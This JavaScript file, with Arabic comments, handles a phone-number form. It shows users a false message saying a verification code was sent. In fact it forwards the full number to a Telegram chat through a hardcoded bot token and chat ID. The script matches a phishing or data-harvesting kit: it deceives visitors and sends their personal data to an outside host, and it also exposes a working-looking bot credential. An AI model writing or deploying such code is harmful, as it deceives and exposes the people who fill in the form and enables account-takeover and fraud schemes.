document.getElementById('phoneForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const countryCode = document.getElementById('country').value;
    const phoneNumber = document.getElementById('phone').value;

    if (!phoneNumber) {
        alert('يرجى إدخال رقم الهاتف');
        return;
    }

    const fullNumber = `+${countryCode}${phoneNumber}`;
    alert(`تم إرسال الكود إلى الرقم: ${fullNumber}`);

    // إرسال البيانات إلى بوت Telegram
    sendToTelegram(fullNumber);
});

function sendToTelegram(message) {
    const botToken = '7352087691:AAFKetidCGiN16_Vk1jCqtn04_Kh9cE--k0'; // استبدل ب Token البوت الخاص بك
    const chatId = '7302541527'; // استبدل ب Chat ID الخاص بك

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: `معلومات النموذج: ${message}`
    };

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('تم إرسال الرسالة إلى Telegram:', result);
    })
    .catch(error => {
        console.error('خطأ في الإرسال:', error);
    });
}
